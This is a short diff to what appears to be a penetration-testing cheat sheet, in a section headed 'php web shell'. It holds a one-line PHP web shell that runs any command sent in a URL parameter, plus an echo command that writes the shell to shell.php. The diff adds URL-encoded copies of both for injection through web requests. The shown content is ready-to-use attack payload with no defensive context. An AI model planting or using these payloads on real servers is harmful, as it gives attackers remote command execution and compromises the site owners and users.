@@ -6,7 +6,10 @@ php web shell
 
 ```
 <?php system($_GET['yz']); ?>
+%3C%3Fphp%20system%28%24%5FGET%5B%22yz%22%5D%29%3B%3F%3E
+
 echo '<pre><?php system($_GET["yz"]);?></pre>' > shell.php
+%0Aecho%20%27%3Cpre%3E%3C%3Fphp%20system%28%24%5FGET%5B%22yz%22%5D%29%3B%3F%3E%3C%2Fpre%3E%27%20%3E%20shell%2Ephp
 ```
 
 world readable files
